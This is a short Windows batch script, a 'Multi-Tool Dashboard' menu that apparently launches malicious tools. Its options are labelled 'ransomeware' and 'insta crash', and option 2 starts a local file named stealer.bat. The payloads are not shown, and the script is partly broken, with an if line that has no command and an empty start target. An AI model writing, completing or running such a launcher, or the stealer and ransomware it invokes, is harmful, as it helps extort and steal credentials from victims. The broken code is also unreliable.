@echo off
chcp 65001 >nul
color 3
cls

:main_menu
cls
echo ╔═══════════════════════════════════════════════╗
echo ║ Multi-Tool Dashboard ║
echo ║ ║
echo ║ 1. soon.
echo ║ 2. ransomeware (takes a bit)  ║
echo ║ 3  insta crash  ║
echo ║ 4. exit ║
echo ╚═══════════════════════════════════════════════╝
echo
set /p choice=start here:
if "%choice%"=="1" 
if "%choice%"=="4" exit 
if "%choice%"=="3" start "" ""
if "%choice%"=="2" start "" "C:\Users\caner\OneDrive\Desktop\The Tool\the Stuff/stealer.bat"